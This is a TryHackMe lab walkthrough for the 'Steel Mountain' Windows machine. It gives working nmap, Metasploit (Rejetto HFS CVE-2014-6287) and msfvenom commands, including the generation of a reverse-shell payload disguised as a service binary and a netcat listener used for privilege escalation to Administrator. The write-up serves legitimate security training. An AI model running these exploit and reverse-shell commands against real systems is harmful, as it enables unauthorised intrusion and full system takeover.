---
title: 'Steel Mountain - TryHackMe Walkthrough'
date: 2020-07-01 00:00:00
featured_image: '/images/posts/stellmountain.jpg'
excerpt: Hack into a Mr. Robot themed Windows machine. Use Metasploit for initial access, utilise powershell for Windows privilege escalation enumeration and learn a new technique to get Administrator access.
---
![](/images/posts/steelmountain-thm.png)

### Goal
Enumerate windows machine, gain initial access and escalate the privilege to administrator.

### Meta
The web page has a image of a Steel Mountain employee of the month and his name is Bill Harper.  
The image meta data (file name) has his name.

### Recon
Using `nmap` doing the reconnaissance on the machine.
The host is blocking the Ping probes, so using `-Pn` switch.
Below are the ports and services that are opened.

    $ nmap -p- -Pn -T5 10.10.19.41

    PORT      STATE SERVICE
    80/tcp    open  http
    135/tcp   open  msrpc
    139/tcp   open  netbios-ssn
    445/tcp   open  microsoft-ds
    3389/tcp  open  ms-wbt-server
    5985/tcp  open  wsman
    8080/tcp  open  http-proxy
    47001/tcp open  winrm
    49152/tcp open  unknown
    49153/tcp open  unknown
    49154/tcp open  unknown
    49155/tcp open  unknown
    49161/tcp open  unknown
    49163/tcp open  unknown
    49164/tcp open  unknown
    MAC Address: 02:34:DB:ED:BE:0E (Unknown)

    Nmap done: 1 IP address (1 host up) scanned in 337.34 seconds

From the above, we can see another web server is running on port 8080 and is a HTTP file server which is running  **Rejetto HTTP  File Server 2.3** , which has vulnerable *[CVE-2014-6287.](https://www.exploit-db.com/exploits/34926)*

### Exploiting the vulnerability
Using the Metasploit `windows/http/rejetto_hfs_exec` exploit, executed the remote code on the victim machine and acquired a session with as bill.

```
    msf5 exploit(windows/http/rejetto_hfs_exec) > show options

    Module options (exploit/windows/http/rejetto_hfs_exec):

       Name       Current Setting  Required  Description
       ----       ---------------  --------  -----------
       HTTPDELAY  10               no        Seconds to wait before terminating web server
       Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
       RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
       RPORT      80               yes       The target port (TCP)
       SRVHOST    0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
       SRVPORT    8080             yes       The local port to listen on.
       SSL        false            no        Negotiate SSL/TLS for outgoing connections
       SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
       TARGETURI  /                yes       The path of the web application
       URIPATH                     no        The URI to use for this exploit (default is random)
       VHOST                       no        HTTP server virtual host


    Exploit target:

       Id  Name
       --  ----
       0   Automatic


    msf5 exploit(windows/http/rejetto_hfs_exec) > set RHOSTS 10.10.118.59
    RHOSTS => 10.10.118.59
    msf5 exploit(windows/http/rejetto_hfs_exec) > set RPORT 8080
    RPORT => 8080
    msf5 exploit(windows/http/rejetto_hfs_exec) > show options

    Module options (exploit/windows/http/rejetto_hfs_exec):

       Name       Current Setting  Required  Description
       ----       ---------------  --------  -----------
       HTTPDELAY  10               no        Seconds to wait before terminating web server
       Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
       RHOSTS     10.10.118.59     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
       RPORT      8080             yes       The target port (TCP)
       SRVHOST    0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
       SRVPORT    8080             yes       The local port to listen on.
       SSL        false            no        Negotiate SSL/TLS for outgoing connections
       SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
       TARGETURI  /                yes       The path of the web application
       URIPATH                     no        The URI to use for this exploit (default is random)
       VHOST                       no        HTTP server virtual host


    Exploit target:

       Id  Name
       --  ----
       0   Automatic


    msf5 exploit(windows/http/rejetto_hfs_exec) > exploit

    [*] Started reverse TCP handler on 10.10.115.73:4444
    [*] Using URL: http://0.0.0.0:8080/FrWIZV
    [*] Local IP: http://10.10.115.73:8080/FrWIZV
    [*] Server started.
    [*] Sending a malicious request to /
    [*] Payload request received: /FrWIZV
    [*] Sending stage (180291 bytes) to 10.10.118.59
    [*] Meterpreter session 1 opened (10.10.115.73:4444 -> 10.10.118.59:49276) at 2020-07-01 23:35:23 +0000
    [!] Tried to delete %TEMP%\XQkwWxweueC.vbs, unknown result
    [*] Server stopped.

    meterpreter > clear
    [-] Unknown command: clear.
    meterpreter > sessions
    Usage: sessions <id>

    Interact with a different session Id.
    This works the same as calling this from the MSF shell: sessions -i <session id>

    meterpreter > sysinfo
    Computer        : STEELMOUNTAIN
    OS              : Windows 2012 R2 (6.3 Build 9600).
    Architecture    : x64
    System Language : en_US
    Domain          : WORKGROUP
    Logged On Users : 1
    Meterpreter     : x86/windows
```

After exploiting with a remote code execution,  a meterpreter session created and the flag is available in `C:\Users\bill\Desktop` as `user.txt`

### Privilege Escalation

- We are into the remote host with a regular user (bill) and needs to escalate the privileges to Administrator account.  
- Using the [Powerup utility - runs on Powershell](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) lets find out if there are any misconfigurations on the victim. Download the power shell code and upload to victim machine Metasploit's `upload` utility.  
- Load the Powershell from meterpreter `load powershell` and execute the `PowerUp.ps1` code with `Invoke-AllChecks`.

```
    meterpreter > upload /root/PowerUp.ps1
    [*] uploading  : /root/PowerUp.ps1 -> PowerUp.ps1
    [*] Uploaded 549.65 KiB of 549.65 KiB (100.0%): /root/PowerUp.ps1 -> PowerUp.ps1
    [*] uploaded   : /root/PowerUp.ps1 -> PowerUp.ps1
    meterpreter > load powershell
    Loading extension powershell...Success.
    meterpreter > pwd
    C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
    meterpreter > ls -lrt
    Listing: C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
    ====================================================================================

    Mode              Size    Type  Last modified              Name
    ----              ----    ----  -------------              ----
    100666/rw-rw-rw-  562841  fil   2020-07-02 00:13:19 +0000  PowerUp.ps1
    40777/rwxrwxrwx   0       dir   2020-07-01 23:35:21 +0000  %TEMP%
    100666/rw-rw-rw-  174     fil   2019-09-27 11:07:07 +0000  desktop.ini
    100777/rwxrwxrwx  760320  fil   2019-09-27 09:24:35 +0000  hfs.exe

    meterpreter > powershell_shell
    PS > . .\PowerUp.ps1
    PS > Invoke-AllChecks
```

- From the output, we can see *AdvancedSystemCareService9* can be a restart-able service and also the path is writable. Using this mis-configuration on the machine, we can push our own code to this service.  

```
    ServiceName    : AdvancedSystemCareService9
    Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
    ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
    StartName      : LocalSystem
    AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
    CanRestart     : True

    ServiceName    : AdvancedSystemCareService9
    Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
    ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
    StartName      : LocalSystem
    AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
    CanRestart     : True

```  

- Get into the shell and stop the AdvancedSystemCareService9 service.   

  `sc stop AdvancedSystemCareService9`  

- Using `msfvenom` lets create a malicious file same as service file name - ASCService.exe, which contains reverse shell.   

 ` $ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.115.73 LPORT=4443 -e x86/shikata_ga_nai -f exe -o ASCService.exe`

- Upload the malicious file to the victim using `upload` utility from meterpreter.  

```
meterpreter > pwd
C:\Program Files (x86)\IObit\Advanced SystemCare
meterpreter > upload ASCService.exe
[*] uploading  : ASCService.exe -> ASCService.exe
[*] Uploaded 72.07 KiB of 72.07 KiB (100.0%): ASCService.exe -> ASCService.exe
[*] uploaded   : ASCService.exe -> ASCService.exe

```  

- In a new terminal session, create a listening service using netcat to listen for a reverse shell:  `nc -lnvp 4443`  

- Start the AdvanceCareSystemService9, which now executes our malicious code: `sc start AdvancedSystemCareService9`  

- The netcat listening service on the terminal will get the reverse shell with Administrator account and the root flag is available in `C:\Users\Administrators\Desktop\root.txt` as 9af5f314f5--------d09803a587db80.  
